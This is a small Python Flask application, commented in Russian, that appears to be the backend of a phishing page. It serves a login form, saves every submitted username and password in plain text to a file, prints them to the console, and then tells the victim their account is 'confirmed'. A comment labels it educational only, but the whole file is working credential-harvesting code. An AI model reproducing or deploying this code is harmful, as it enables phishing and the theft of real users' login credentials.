from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# Маршрут для главной страницы (страницы входа)
@app.route('/')
def index():
    return render_template('index.html')

# Маршрут для обработки отправки формы
@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        # Получаем данные из формы
        username = request.form['username']
        password = request.form['password']

        # !!! ВАЖНО: Этот раздел предназначен только для образовательных целей. !!!
        # !!! В реальном приложении НИКОГДА не сохраняйте учетные данные таким образом. !!!

        # Запись данных в файл 'credentials.txt'
        try:
            with open('credentials.txt', 'a') as f:
                f.write(f"Username: {username}, Password: {password}\n")
            print(f"Данные сохранены в credentials.txt: Пользователь - {username}, Пароль - {password}")
        except Exception as e:
            print(f"Ошибка при записи в файл: {e}")

        # Вывод данных в консоль PyCharm
        print(f"Попытка входа: Пользователь - {username}, Пароль - {password}")

        # Вы можете перенаправить пользователя на другую страницу
        # или показать сообщение после успешной "отправки"
        return "Спасибо, вы подтвердили свой аккаунт!"

# Запуск приложения Flask
if __name__ == '__main__':
    # debug=True позволяет автоматически перезагружать сервер при изменениях
    # и предоставляет подробные сообщения об ошибках
    app.run(debug=True)